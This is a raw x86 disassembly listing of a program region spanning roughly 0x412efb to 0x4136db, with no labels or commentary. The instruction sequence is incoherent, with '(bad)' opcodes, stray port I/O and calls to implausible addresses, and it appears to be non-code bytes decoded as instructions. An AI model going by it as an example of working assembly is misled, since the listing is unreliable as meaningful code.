  412efb:	add    dl,BYTE PTR [esp+ecx*4+0x34]
  412eff:	adc    DWORD PTR [eax+eax*1],ecx
  412f02:	mov    ds:0xaa0511c0,al
  412f07:	xor    BYTE PTR [eax+eiz*2+0x40e26104],ah
  412f0e:	or     al,BYTE PTR [eax]
  412f10:	inc    ebp
  412f11:	inc    eax
  412f12:	nop
  412f13:	mov    dl,BYTE PTR [ecx]
  412f15:	add    al,BYTE PTR [edx]
  412f17:	adc    DWORD PTR es:[edx],eax
  412f1a:	add    BYTE PTR [eax+0x0],al
  412f1d:	or     al,0x80
  412f1f:	add    eax,0x93d20121
  412f24:	and    DWORD PTR [esi],eax
  412f26:	add    BYTE PTR [edx],ah
  412f28:	push   0xc3004900
  412f2d:	in     al,0x24
  412f2f:	call   0x1b512f74
  412f34:	and    bh,BYTE PTR [ebx-0x7a7fefb4]
  412f3a:	and    BYTE PTR [eax],al
  412f3c:	add    BYTE PTR [edx+eiz*1],al
  412f3f:	inc    eax
  412f40:	add    BYTE PTR [eax],dh
  412f42:	and    al,0x4
  412f44:	sbb    BYTE PTR [eax],0x0
  412f47:	data16 test BYTE PTR [ecx+0x460],dl
  412f4e:	pop    eax
  412f4f:	and    al,BYTE PTR [eax+0x2815ffd8]
  412f55:	xchg   ebp,eax
  412f56:	inc    edx
  412f57:	add    BYTE PTR ds:0xb382cd0,al
  412f5d:	data16 sbb BYTE PTR [eax+0x1028148],cl
  412f64:	sbb    BYTE PTR [ecx],dl
  412f66:	xchg   ebx,eax
  412f67:	add    al,0x91
  412f69:	mov    eax,ds:0x8204000
  412f6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f6f:	dec    eax
  412f70:	mov    al,ds:0x8b600701
  412f75:	and    BYTE PTR [eax],0x44
  412f78:	sbb    esi,DWORD PTR [esi]
  412f7a:	add    al,0x80
  412f7c:	inc    esp
  412f7d:	add    eax,0x6020008
  412f82:	dec    edx
  412f83:	and    DWORD PTR [ecx-0x2c],eax
  412f86:	add    al,0x88
  412f88:	add    BYTE PTR [eax],dl
  412f8a:	or     al,0x8
  412f8c:	fld    QWORD PTR [edx+eax*4-0x4d97ff7c]
  412f93:	or     al,BYTE PTR [esi-0x759bde80]
  412f99:	inc    ebp
  412f9a:	test   DWORD PTR [ecx],ecx
  412f9c:	adc    al,0x80
  412f9e:	inc    eax
  412f9f:	dec    edi
  412fa0:	and    BYTE PTR [eax+ecx*1],0x28
  412fa4:	nop
  412fa5:	add    BYTE PTR [ebx],cl
  412fa7:	or     DWORD PTR [eax],eax
  412fa9:	or     BYTE PTR [eax],dl
  412fab:	and    BYTE PTR [ecx],al
  412fad:	mov    al,ds:0x29142022
  412fb2:	add    BYTE PTR [eax],al
  412fb4:	add    al,BYTE PTR [eax-0x48]
  412fb7:	adc    BYTE PTR [eax],al
  412fb9:	cwde   
  412fba:	add    al,BYTE PTR [edx]
  412fbc:	add    DWORD PTR [ebx],eax
  412fbe:	sub    DWORD PTR [edx+0x18012330],esi
  412fc4:	push   ecx
  412fc5:	push   ss
  412fc6:	add    DWORD PTR es:[ecx],0x18310421
  412fcd:	add    edx,eax
  412fcf:	add    BYTE PTR [ecx],al
  412fd1:	add    BYTE PTR [ecx+0x20],ah
  412fd4:	ror    BYTE PTR [eax+0x6840087],0xa
  412fdb:	and    BYTE PTR [ecx+eax*4],cl
  412fde:	add    al,BYTE PTR [ebx]
  412fe0:	adc    al,BYTE PTR [edx]
  412fe2:	test   DWORD PTR [edx],edx
  412fe4:	and    cl,bl
  412fe6:	mov    WORD PTR [eax],es
  412fe8:	nop
  412fe9:	test   al,0x8
  412feb:	inc    ecx
  412fec:	or     al,0x8
  412fee:	add    al,0x49
  412ff0:	push   ebp
  412ff1:	add    BYTE PTR [edx],al
  412ff3:	adc    BYTE PTR [eax],ch
  412ff5:	add    al,BYTE PTR [eax+0x0]
  412ff8:	add    BYTE PTR [edx],dh
  412ffa:	jo     0x41300d
  412ffc:	mov    BYTE PTR [eax],al
  412ffe:	aam    0x80
  413000:	adc    BYTE PTR [ecx],dh
  413002:	adc    al,dl
  413004:	inc    ebp
  413005:	add    al,BYTE PTR [eax]
  413007:	sub    ch,BYTE PTR [eax-0x36ff6f54]
  41300d:	sbb    eax,DWORD PTR [ecx]
  41300f:	ret    0xe0a1
  413012:	and    al,0xd0
  413014:	xchg   ecx,eax
  413015:	test   BYTE PTR [eax],al
  413017:	inc    edx
  413018:	adc    BYTE PTR [ebx],bh
  41301a:	or     DWORD PTR [eax+0x0],ecx
  413020:	or     BYTE PTR [eax],al
  413022:	xor    DWORD PTR [eax+0x30184800],eax
  413028:	and    BYTE PTR [eax],al
  41302a:	and    BYTE PTR [eax+0x20],ah
  41302d:	add    dl,BYTE PTR [edx]
  41302f:	nop
  413030:	inc    eax
  413031:	push   es
  413032:	add    al,BYTE PTR [ecx]
  413034:	pop    ecx
  413035:	add    BYTE PTR [eax+ecx*2-0x1ebf97ea],bl
  41303c:	inc    esp
  41303d:	adc    edx,DWORD PTR [ebx+edx*8+0x0]
  413041:	and    BYTE PTR [eax],ah
  413043:	add    DWORD PTR [eax+eax*1],0xe0029054
  41304a:	add    DWORD PTR [edx],eax
  41304c:	mov    ecx,0xd302004e
  413051:	or     al,0xc
  413053:	sub    al,0xc1
  413055:	cmp    eax,DWORD PTR [edx]
  413057:	inc    ecx
  413058:	add    al,0x0
  41305a:	xor    BYTE PTR [eax],al
  41305c:	add    DWORD PTR [edx+eax*8+0x64],edi
  413060:	add    DWORD PTR [edx],eax
  413062:	and    BYTE PTR [ecx],al
  413064:	pop    es
  413065:	inc    eax
  413066:	stos   BYTE PTR es:[edi],al
  413067:	adc    BYTE PTR [eax+0x40206a6],0x4
  41306e:	call   0x80e255f7
  413073:	adc    BYTE PTR ds:0x20413000,dl
  413079:	nop
  41307a:	add    dl,BYTE PTR [eax+0x2334418c]
  413080:	test   BYTE PTR [ecx+0x0],al
  413083:	and    BYTE PTR [ebp+ecx*1+0x20],dh
  413087:	add    BYTE PTR [eax-0x68],al
  41308a:	inc    ecx
  41308b:	or     al,0x0
  41308d:	and    DWORD PTR [eax],esp
  41308f:	out    0x20,al
  413091:	inc    eax
  413092:	aam    0x3
  413094:	mov    BYTE PTR [ebx+0x8c0469],cl
  41309a:	and    BYTE PTR [eax+eax*4+0x514050cd],ah
  4130a1:	or     DWORD PTR [eax+0x17],0x1b
  4130a5:	add    BYTE PTR [eax],dh
  4130a7:	mov    WORD PTR [eax+eiz*2+0x28020354],es
  4130ae:	ror    DWORD PTR [ecx+ecx*1+0x430089c],0x80
  4130b6:	enter  0x6420,0x0
  4130ba:	push   eax
  4130bb:	xchg   BYTE PTR ds:0x12088002,bl
  4130c1:	and    DWORD PTR [ebx],edx
  4130c3:	sbb    BYTE PTR ss:[edx-0x80],dl
  4130c7:	inc    esp
  4130c8:	add    BYTE PTR [eax+0x39510248],al
  4130ce:	push   ecx
  4130cf:	add    BYTE PTR [ecx-0x3736f3ee],al
  4130d5:	add    BYTE PTR [esi],al
  4130d7:	or     al,BYTE PTR [eax]
  4130d9:	jo     0x41305b
  4130db:	add    BYTE PTR [esp+eax*1],al
  4130de:	adc    BYTE PTR [eax-0x80],cl
  4130e1:	add    BYTE PTR [ecx+eax*2],al
  4130e4:	inc    esp
  4130e5:	and    DWORD PTR [edi],eax
  4130e7:	and    BYTE PTR [ecx+0x20050440],al
  4130ed:	sub    BYTE PTR [eax+0x40],cl
  4130f0:	push   eax
  4130f1:	mov    al,ds:0x50400806
  4130f6:	push   eax
  4130f7:	sub    eax,0x1e000000
  4130fc:	or     BYTE PTR [ecx+0x4217812],al
  413102:	and    al,0x45
  413104:	mov    al,0x11
  413106:	add    BYTE PTR [eax],al
  413108:	add    DWORD PTR [eax+0x49a90201],ebp
  41310e:	shl    BYTE PTR [eax],0x86
  413111:	add    DWORD PTR [edx],edx
  413113:	or     BYTE PTR [eax],dl
  413115:	rol    BYTE PTR [edx],0x2
  413118:	sub    BYTE PTR [edx+0x40],dh
  41311b:	add    BYTE PTR [eax+eax*1],cl
  41311e:	or     bl,BYTE PTR [esi]
  413120:	mov    al,0x4c
  413122:	add    al,0x82
  413124:	add    BYTE PTR [eax+0x0],cl
  413127:	dec    eax
  413128:	rol    DWORD PTR [edx],0x1
  41312b:	fs daa 
  41312d:	add    BYTE PTR fs:[ecx+0x32214600],bl
  413134:	cmp    al,BYTE PTR [eax]
  413136:	and    BYTE PTR [eax],al
  413138:	adc    BYTE PTR [eax+eax*1+0x22],ch
  41313c:	and    dl,BYTE PTR [edx]
  41313e:	inc    eax
  41313f:	and    BYTE PTR [eax],ah
  413141:	add    BYTE PTR [eax],al
  413143:	adc    BYTE PTR [ebx],al
  413145:	inc    edx
  413146:	add    al,0x40
  413148:	mov    BYTE PTR [ecx],al
  41314a:	xor    BYTE PTR [ecx],ah
  41314c:	inc    eax
  41314d:	adc    DWORD PTR [eax+eax*1],eax
  413150:	and    BYTE PTR [eax],al
  413152:	or     bl,BYTE PTR [eax+0x4024482]
  413158:	pusha  
  413159:	or     BYTE PTR [edx+eiz*1+0x0],0x0
  41315e:	inc    ecx
  41315f:	mov    eax,DWORD PTR [eax+0x23400c60]
  413165:	inc    esp
  413166:	test   BYTE PTR [edx+ebp*4],ch
  413169:	or     BYTE PTR [edi+0x306000],dl
  41316f:	and    ah,BYTE PTR [eax-0x40000000]
  413175:	add    eax,0x401b200
  41317a:	shl    BYTE PTR es:[eax],0x8
  41317e:	add    al,0x10
  413180:	add    BYTE PTR [ebx],0xc0
  413183:	mov    ds:0x41472233,al
  413188:	xor    BYTE PTR [eax+0x59252080],al
  41318e:	add    BYTE PTR [eax+0x40],al
  413191:	mov    al,ds:0x3200081
  413196:	xchg   BYTE PTR [eax+0x8],dl
  413199:	add    BYTE PTR [eax+esi*1-0x3fcb7ec0],0x1
  4131a1:	adc    BYTE PTR [edx],al
  4131a3:	add    BYTE PTR [eax+0x54f0f4a1],al
  4131a9:	adc    al,0xa
  4131ab:	stos   DWORD PTR es:[edi],eax
  4131ac:	test   dl,ch
  4131ae:	add    al,0x11
  4131b0:	add    DWORD PTR [eax],ecx
  4131b2:	inc    eax
  4131b3:	test   BYTE PTR [eax-0x7fbd77c5],cl
  4131b9:	daa    
  4131ba:	adc    BYTE PTR [edx],0x0
  4131bd:	add    DWORD PTR [ebx],ebp
  4131bf:	add    DWORD PTR [ebx-0x2f],ecx
  4131c2:	mov    eax,0x48060150
  4131c7:	mov    al,ds:0x21080814
  4131cc:	and    BYTE PTR [esp+ecx*1+0xa],ah
  4131d0:	test   BYTE PTR [esp+edx*4],al
  4131d3:	or     ah,BYTE PTR [edx]
  4131d5:	and    BYTE PTR [ecx],al
  4131d7:	jae    0x4131fc
  4131d9:	add    BYTE PTR [esi],al
  4131db:	inc    esp
  4131dc:	dec    ecx
  4131dd:	mov    al,ds:0x911408a
  4131e2:	test   DWORD PTR [edx],ebx
  4131e4:	nop
  4131e5:	loopne 0x413189
  4131e7:	xchg   ecx,eax
  4131e8:	add    edx,DWORD PTR [ecx+eiz*8+0x18]
  4131ec:	add    eax,0x6200c080
  4131f1:	ret    
  4131f2:	add    edx,eax
  4131f4:	and    BYTE PTR [eax-0x3c],al
  4131f7:	add    al,0xc
  4131f9:	loopne 0x4131fb
  4131fb:	shl    BYTE PTR [ebx],0x40
  4131fe:	xchg   ecx,eax
  4131ff:	inc    ebx
  413200:	adc    BYTE PTR [edx],ch
  413202:	add    BYTE PTR [esi+ebp*4+0x8],ah
  413206:	add    al,BYTE PTR [ebp+0x6a]
  413209:	add    BYTE PTR [eax],al
  41320b:	lods   eax,DWORD PTR ds:[esi]
  41320c:	add    al,BYTE PTR [eax+0x28]
  41320f:	add    al,0x32
  413211:	push   ecx
  413212:	dec    edx
  413213:	add    BYTE PTR [eax-0x7b9fcda0],al
  413219:	adc    al,0x23
  41321b:	inc    ecx
  41321c:	add    BYTE PTR [eax+esi*1],0x1
  413220:	add    DWORD PTR [eax+eax*4],edi
  413223:	sbb    dl,BYTE PTR [eax]
  413225:	or     BYTE PTR [ecx+0x10146340],al
  41322b:	push   es
  41322c:	add    al,0x40
  41322e:	xor    BYTE PTR [eax],0x71
  413231:	inc    eax
  413232:	mov    BYTE PTR [eax+ecx*1+0x61],ah
  413236:	add    al,al
  413238:	add    DWORD PTR [ecx],eax
  41323a:	sar    BYTE PTR [ecx-0x3d6f47ec],0x32
  413241:	test   DWORD PTR [eax+esi*4],eax
  413244:	and    ah,BYTE PTR [edx-0x80]
  413247:	add    al,dl
  413249:	sub    BYTE PTR [eax+eax*1+0x3820c010],dh
  413250:	dec    edx
  413251:	xor    eax,DWORD PTR [ebx+eax*8-0x7f57bff7]
  413258:	mov    eax,ds:0x66122002
  41325d:	add    BYTE PTR [ebx+eiz*8],al
  413260:	shl    DWORD PTR [edx],1
  413262:	test   BYTE PTR [ecx+eax*1-0x7ff58f78],dh
  413269:	shl    BYTE PTR [eax+0xc2c8010],1
  41326f:	inc    eax
  413270:	and    BYTE PTR [ecx],0x41
  413273:	push   eax
  413274:	add    BYTE PTR [edx],cl
  413276:	and    BYTE PTR [eax],al
  413278:	or     BYTE PTR [eax],al
  41327a:	add    ah,BYTE PTR [ecx]
  41327c:	add    al,0x2
  41327e:	add    BYTE PTR [eax+edx*2],0x20
  413282:	inc    eax
  413283:	push   cs
  413284:	rcr    DWORD PTR [eax+0x0],0xd4
  413288:	add    BYTE PTR [eax+0x1014842],al
  41328e:	stos   BYTE PTR es:[edi],al
  41328f:	and    DWORD PTR [edx+0x2],eax
  413292:	rol    BYTE PTR [ecx],0x0
  413295:	adc    ecx,edx
  413297:	add    BYTE PTR [ecx],0xd
  41329a:	into   
  41329b:	mov    WORD PTR [eax+0x0],cs
  41329e:	mov    BYTE PTR [edx+edx*2],ah
  4132a1:	push   eax
  4132a2:	add    BYTE PTR [eax],al
  4132a4:	adc    BYTE PTR [edx],al
  4132a6:	push   0x10
  4132a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132a9:	add    al,0x20
  4132ab:	sub    esi,DWORD PTR [ecx]
  4132ad:	push   es
  4132ae:	pusha  
  4132af:	or     ah,BYTE PTR [eax]
  4132b1:	and    BYTE PTR [ecx],0x0
  4132b4:	add    al,0x50
  4132b6:	inc    ebx
  4132b7:	or     BYTE PTR [edx+0x1],ah
  4132ba:	push   eax
  4132bb:	mov    BYTE PTR [eax],dl
  4132bd:	adc    BYTE PTR [esi+0x58],cl
  4132c0:	dec    eax
  4132c1:	mov    WORD PTR [eax],es
  4132c3:	add    al,BYTE PTR [eax]
  4132c5:	or     DWORD PTR [edx+edx*4],esp
  4132c8:	add    BYTE PTR [esi+0x65],ah
  4132cb:	shl    BYTE PTR [eax+0x15000159],0x1
  4132d2:	add    BYTE PTR [eax+0x0],ah
  4132d5:	add    al,0x6
  4132d7:	inc    ebp
  4132d8:	mov    al,ds:0xc500400
  4132dd:	or     BYTE PTR ds:0x8200c841,al
  4132e3:	or     cl,0x9
  4132e6:	add    cl,BYTE PTR [eax]
  4132e8:	or     BYTE PTR [eax],al
  4132ea:	and    ecx,DWORD PTR [ecx]
  4132ec:	je     0x4132ef
  4132ee:	and    cl,BYTE PTR [eax]
  4132f0:	add    al,0x20
  4132f2:	adc    DWORD PTR [edx+eax*1+0x2],esp
  4132f6:	add    DWORD PTR [edx],eax
  4132f8:	pusha  
  4132f9:	add    BYTE PTR [eax-0x7d],ah
  4132fc:	bound  edx,QWORD PTR [ebx-0x7c7f0bfc]
  413302:	sub    ebp,DWORD PTR [eax]
  413304:	add    BYTE PTR [edx+0x41],al
  413307:	add    ecx,DWORD PTR [eax+0x2812800]
  41330d:	add    DWORD PTR [edx+0x40],eax
  413310:	inc    edx
  413311:	add    BYTE PTR [ebx+eax*4+0x106922c8],ch
  413318:	les    eax,FWORD PTR [esi+0x8030890]
  41331e:	popa   
  41331f:	or     eax,DWORD PTR [ebx]
  413321:	or     DWORD PTR [edx],edx
  413323:	and    BYTE PTR [ebx],dl
  413325:	add    al,0x40
  413327:	inc    eax
  413328:	mov    al,ds:0x800d0284
  41332d:	adc    BYTE PTR [eax],al
  41332f:	add    al,BYTE PTR [eax]
  413331:	adc    al,0x11
  413333:	add    BYTE PTR [ecx-0x1fff7f80],cl
  413339:	inc    eax
  41333a:	or     DWORD PTR [ebx],0x1c380d
  413340:	inc    eax
  413341:	adc    BYTE PTR [eax+0x30051930],al
  413347:	popa   
  413348:	add    al,BYTE PTR [eax+eax*2+0x9]
  41334c:	inc    eax
  41334d:	xor    ecx,DWORD PTR [edx+0x40]
  413350:	or     BYTE PTR [eax+0x85108b],dl
  413356:	in     al,dx
  413357:	add    BYTE PTR [ecx],al
  413359:	sub    BYTE PTR [eax],ah
  41335b:	pusha  
  41335c:	and    eax,esp
  41335e:	add    DWORD PTR [eax-0x7e],edx
  413361:	push   es
  413362:	sbb    DWORD PTR [ecx],esp
  413364:	and    cl,BYTE PTR [eax-0x40]
  413367:	add    BYTE PTR [eax],bl
  413369:	and    BYTE PTR [eax+0x10],0x0
  41336d:	add    al,0xa
  41336f:	inc    esp
  413370:	dec    eax
  413371:	les    eax,FWORD PTR [eax]
  413373:	add    BYTE PTR [ebx+0x28],0x20
  413377:	inc    ebp
  413378:	or     DWORD PTR [eax],eax
  41337a:	and    BYTE PTR [esi+ecx*2],dl
  41337d:	xor    BYTE PTR [ecx+esi*8],cl
  413380:	inc    esi
  413381:	inc    esp
  413382:	or     al,0x0
  413384:	add    BYTE PTR [eax+0x7412a0a3],al
  41338a:	inc    esp
  41338b:	popa   
  41338c:	add    eax,DWORD PTR [ebx-0x7e]
  41338f:	add    DWORD PTR [ecx+ecx*1],0x81381000
  413396:	adc    bl,bl
  413398:	and    dl,BYTE PTR [esp+ebx*1+0x31]
  41339c:	or     BYTE PTR [edx-0x5e],bl
  41339f:	jle    0x413322
  4133a1:	or     DWORD PTR [eax+0x10910044],0xb464908c
  4133ab:	and    DWORD PTR [eax+0x14a12011],esp
  4133b1:	cmp    BYTE PTR [ebx],al
  4133b3:	test   BYTE PTR [edx+eiz*4],al
  4133b6:	mov    al,ds:0x230020
  4133bb:	and    eax,0x4c65928
  4133c0:	inc    esp
  4133c1:	add    BYTE PTR [eax-0x7b9f5fbe],al
  4133c7:	xor    DWORD PTR [ecx+0x2206030],ebx
  4133cd:	add    BYTE PTR [eax],dl
  4133cf:	add    eax,0x43a02015
  4133d4:	je     0x41335b
  4133d6:	pusha  
  4133d7:	inc    eax
  4133d8:	or     al,BYTE PTR [eax+ebp*1]
  4133db:	adc    BYTE PTR [ecx],ah
  4133dd:	and    al,0x0
  4133df:	add    al,BYTE PTR [edx+0x20720500]
  4133e5:	mov    ds:0x22500004,al
  4133ea:	add    BYTE PTR [edx],0xd
  4133ed:	push   es
  4133ee:	pusha  
  4133ef:	or     BYTE PTR [eax],ah
  4133f1:	add    BYTE PTR [eax+ecx*1+0x2005928],dl
  4133f8:	add    al,BYTE PTR [ecx+0x21010c00]
  4133fe:	js     0x413462
  413400:	pop    ebp
  413401:	add    BYTE PTR [eax+0x15203084],dh
  413407:	adc    BYTE PTR [ebx-0x5fafcff8],al
  41340d:	or     BYTE PTR [esi+0x200800c2],al
  413413:	icebp  
  413414:	and    esi,DWORD PTR [eax+0x5a]
  413417:	adc    al,0x8c
  413419:	rol    DWORD PTR [eax],0x70
  41341c:	add    BYTE PTR [edx+ecx*1],cl
  41341f:	add    BYTE PTR [eax],al
  413421:	add    DWORD PTR [eax],ecx
  413423:	push   eax
  413424:	or     DWORD PTR [eax],eax
  413426:	mov    al,0x40
  413428:	push   eax
  413429:	rcr    BYTE PTR [ebx-0x7beff09c],cl
  41342f:	push   eax
  413430:	add    DWORD PTR ds:0x80804192,0x4a
  413437:	inc    ecx
  413438:	add    DWORD PTR [eax+0x30440050],0x30800804
  413442:	add    BYTE PTR [ebp+0x40],dl
  413445:	or     BYTE PTR [eax],al
  413447:	add    DWORD PTR [eax+ecx*2+0x11817c32],eax
  41344e:	add    BYTE PTR [eax+ecx*4+0xa0ae20],cl
  413455:	aaa    
  413456:	adc    BYTE PTR [eax],bl
  413458:	mov    BYTE PTR [ebp-0x39d7cf01],al
  41345e:	add    BYTE PTR [eax],0x41
  413461:	nop
  413462:	add    BYTE PTR [edx],dh
  413464:	xor    BYTE PTR [ebx],ah
  413466:	inc    eax
  413467:	inc    ebx
  413468:	add    BYTE PTR [ecx-0x46],al
  41346b:	jl     0x413470
  41346d:	add    al,0x66
  41346f:	mov    dl,BYTE PTR [eax]
  413471:	dec    esp
  413472:	add    DWORD PTR [eax],eax
  413474:	and    BYTE PTR [ecx+0x30],cl
  413477:	pop    ss
  413478:	or     BYTE PTR [eax],al
  41347a:	hlt    
  41347b:	nop
  41347c:	add    BYTE PTR [eax],al
  41347e:	sub    DWORD PTR [eax+ebx*1],eax
  413481:	push   eax
  413482:	sbb    eax,0x7038200
  413487:	js     0x41348d
  413489:	rol    BYTE PTR [eax+edx*1],0xaa
  41348d:	inc    eax
  41348e:	leave  
  41348f:	dec    ecx
  413490:	add    BYTE PTR [eax+eax*1],cl
  413493:	add    DWORD PTR [ecx+0x8],ecx
  413496:	dec    eax
  413497:	inc    eax
  413498:	add    al,0xa0
  41349a:	and    DWORD PTR [ecx+0x20],ebp
  41349d:	add    al,0xca
  41349f:	mov    BYTE PTR [eax],cl
  4134a1:	inc    eax
  4134a2:	adc    DWORD PTR [ebx+0xa000914],eax
  4134a8:	or     BYTE PTR [edi+0x28108301],al
  4134ae:	adc    DWORD PTR [eax],edx
  4134b0:	xchg   ebp,eax
  4134b1:	mov    ds:0x94020800,eax
  4134b6:	test   al,ah
  4134b8:	add    al,dl
  4134ba:	adc    BYTE PTR [ecx+0x352004ab],al
  4134c0:	dec    esp
  4134c1:	inc    ecx
  4134c2:	cmp    cl,BYTE PTR [eax+0x31800401]
  4134c8:	nop
  4134c9:	add    DWORD PTR [ebx],esp
  4134cb:	ror    BYTE PTR [edx],0x10
  4134ce:	adc    BYTE PTR [ebx],al
  4134d0:	push   esp
  4134d1:	add    DWORD PTR [ecx-0x7fb7debf],0x10218384
  4134db:	add    DWORD PTR [edx+eax*2],ecx
  4134de:	add    dl,al
  4134e0:	cmp    BYTE PTR [ecx+0x22096081],0x8
  4134e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134e8:	add    BYTE PTR [edx],al
  4134ea:	add    BYTE PTR ds:0x83024,dh
  4134f0:	or     dl,al
  4134f2:	add    BYTE PTR [edx+0x0],0x8
  4134f6:	push   0x10204826
  4134fb:	push   ecx
  4134fc:	push   eax
  4134fd:	and    al,0x10
  4134ff:	and    al,cl
  413501:	add    al,0xc4
  413503:	and    DWORD PTR [ecx],eax
  413505:	add    eax,DWORD PTR [eax+edi*4-0x80]
  413509:	sbb    eax,0x442c8248
  41350e:	adc    al,BYTE PTR [edx]
  413510:	adc    dl,BYTE PTR [ecx+0x65]
  413513:	sub    BYTE PTR [eax],0xc
  413516:	add    BYTE PTR [eax+0x10a08d1a],ch
  41351c:	sbb    al,0xb6
  41351e:	les    ecx,FWORD PTR [eax]
  413520:	and    BYTE PTR [eax],ah
  413522:	test   BYTE PTR [eax+0x38020040],al
  413528:	or     al,0x40
  41352a:	and    DWORD PTR [ebx],esp
  41352c:	and    DWORD PTR [edx],0x60414263
  413532:	xchg   BYTE PTR [ecx+0x0],cl
  413535:	pop    ss
  413536:	inc    esp
  413537:	add    DWORD PTR [eax+0x5d280],0x292080
  413541:	bound  eax,QWORD PTR [eax+0x12c28013]
  413547:	pushf  
  413548:	add    BYTE PTR [eax],cl
  41354a:	nop
  41354b:	loopne 0x41355f
  41354d:	cwde   
  41354e:	adc    dl,BYTE PTR [eax]
  413550:	xchg   ecx,eax
  413551:	pop    es
  413552:	cmp    BYTE PTR [eax],ch
  413554:	and    BYTE PTR [eax+0x26022dc8],al
  41355a:	cmp    BYTE PTR [eax+0x13],al
  41355d:	dec    eax
  41355e:	aam    0x14
  413560:	rol    BYTE PTR [eax+0x0],0x0
  413564:	push   0x80c2188a
  413569:	add    al,0xd0
  41356b:	dec    edx
  41356c:	add    BYTE PTR [eax],dl
  41356e:	add    al,0xc
  413570:	xor    eax,DWORD PTR [edx]
  413572:	add    ebx,DWORD PTR [esi]
  413574:	add    BYTE PTR [eax],dl
  413576:	call   0x1ac141dd
  41357b:	test   al,0x0
  41357d:	mov    al,ds:0x4604000
  413582:	(bad)  
  413583:	adc    BYTE PTR [ecx],dl
  413585:	and    al,0x1
  413587:	test   BYTE PTR [edi+0x18220131],ah
  41358d:	dec    eax
  41358e:	add    BYTE PTR [eax],cl
  413590:	adc    al,0x12
  413592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413593:	and    DWORD PTR [eax],eax
  413595:	push   0x0
  413597:	add    al,0x41
  413599:	inc    esi
  41359a:	and    al,0x20
  41359c:	add    BYTE PTR [ecx+0x16],ah
  41359f:	pusha  
  4135a0:	cmp    DWORD PTR ds:0x122312,esp
  4135a6:	and    BYTE PTR [eax],al
  4135a8:	or     al,BYTE PTR [eax+0x200a5502]
  4135ae:	and    eax,DWORD PTR [eax+eiz*1]
  4135b1:	and    BYTE PTR [eax],dl
  4135b3:	and    DWORD PTR [eax],esp
  4135b5:	retf   0x915
  4135b8:	dec    ecx
  4135b9:	bound  edi,QWORD PTR [eax]
  4135bb:	add    DWORD PTR [eax-0x3ffadfdd],esp
  4135c1:	xor    DWORD PTR [eax-0x7bfc6ffe],ebp
  4135c7:	xchg   edx,eax
  4135c8:	add    BYTE PTR ds:0x4e4002,al
  4135ce:	add    al,0x1c
  4135d0:	and    BYTE PTR [eax],al
  4135d2:	inc    edx
  4135d3:	and    al,0x20
  4135d5:	mov    BYTE PTR [ecx+0x0],al
  4135d8:	nop
  4135d9:	pusha  
  4135da:	mov    eax,ds:0x60200218
  4135df:	inc    eax
  4135e0:	add    BYTE PTR [ecx],ah
  4135e2:	pop    es
  4135e3:	xor    BYTE PTR [edx],cl
  4135e5:	and    BYTE PTR [ecx],ah
  4135e7:	xchg   esi,eax
  4135e8:	push   eax
  4135e9:	add    ah,bl
  4135eb:	nop
  4135ec:	adc    BYTE PTR [eax+eax*1+0x47008004],ch
  4135f3:	add    BYTE PTR [eax+0x41],dh
  4135f6:	test   BYTE PTR [eax],ch
  4135f8:	adc    BYTE PTR [eax+eax*2],al
  4135fb:	rcl    DWORD PTR [ecx+0x513108e0],1
  413601:	mov    eax,0x5d049014
  413606:	mov    ds:0x5691311,al
  41360b:	adc    DWORD PTR [eax],eax
  41360d:	adc    DWORD PTR [eax],eax
  41360f:	pop    eax
  413610:	inc    ebp
  413611:	add    BYTE PTR [eax],dl
  413613:	mov    BYTE PTR [eax],al
  413615:	mov    WORD PTR [edx+eiz*1],cs
  413618:	xor    BYTE PTR [ebx],cl
  41361a:	add    dl,cl
  41361c:	xor    dh,BYTE PTR [eax]
  41361e:	xor    BYTE PTR [edx],al
  413620:	or     BYTE PTR [esi+0x15],cl
  413623:	mov    BYTE PTR [eax+0x64008488],bl
  413629:	or     BYTE PTR [eax],ah
  41362b:	xchg   edx,eax
  41362c:	adc    BYTE PTR [edx*1+0x22008a6a],cl
  413633:	or     DWORD PTR [ebx+0x2fb02016],esp
  413639:	rol    BYTE PTR [eax],cl
  41363b:	adc    BYTE PTR [eax+0x40],cl
  41363e:	mov    al,ds:0xe8528ea0
  413643:	fisttp DWORD PTR [ecx+0x8126984]
  413649:	adc    edx,DWORD PTR [edi+0x28800202]
  41364f:	add    al,0x81
  413651:	push   ss
  413652:	add    BYTE PTR [ecx+0xa],ah
  413655:	cs add al,0x10
  413658:	sbb    DWORD PTR [eax],0x2204200
  41365e:	inc    eax
  41365f:	sbb    ch,cl
  413661:	add    BYTE PTR [eax],ch
  413663:	sub    BYTE PTR ds:0x1e04001,al
  413669:	adc    BYTE PTR [edx],cl
  41366b:	or     BYTE PTR [esp+edx*1],dl
  41366e:	inc    eax
  41366f:	inc    eax
  413670:	and    BYTE PTR [ecx+eiz*1-0x6dbfbd6d],dh
  413677:	and    BYTE PTR [edx-0x40],al
  41367a:	sub    eax,0x4024b668
  41367f:	add    BYTE PTR [edx+0x8952820],al
  413685:	sbb    BYTE PTR [eax],al
  413687:	rol    BYTE PTR [edx-0x77fdd7c0],0x6c
  41368e:	or     eax,0x40500801
  413693:	mov    WORD PTR [eax-0x7b36bf5c],fs
  413699:	and    BYTE PTR [ecx+eiz*4],bl
  41369c:	push   ss
  41369d:	daa    
  41369e:	sbb    edx,esp
  4136a0:	cs dec esp
  4136a2:	or     cl,BYTE PTR [ebx]
  4136a4:	add    al,0x0
  4136a6:	or     al,0x42
  4136a8:	adc    DWORD PTR [eax+edx*1],edx
  4136ab:	and    BYTE PTR [ecx+0x32],cl
  4136ae:	inc    eax
  4136af:	pusha  
  4136b0:	add    BYTE PTR [eax],0x14
  4136b3:	add    BYTE PTR [ecx-0x30],ah
  4136b6:	or     BYTE PTR [eax],0x50
  4136b9:	sub    DWORD PTR [eax+0xa],esp
  4136bc:	or     BYTE PTR [ecx+0x10],dl
  4136bf:	sbb    DWORD PTR [ebx],eax
  4136c1:	adc    ch,BYTE PTR [eax]
  4136c3:	ins    BYTE PTR es:[edi],dx
  4136c4:	xchg   edx,eax
  4136c5:	add    BYTE PTR [eax+0x4],0x4
  4136c9:	nop
  4136ca:	inc    eax
  4136cb:	or     BYTE PTR [eax+0x8280930],ah
  4136d1:	and    al,0x40
  4136d3:	push   ebp
  4136d4:	inc    eax
  4136d5:	xor    BYTE PTR [esi-0x6e270dfb],ah
  4136db:	add    DWORD PTR [ecx+eax*1+0x0],eax
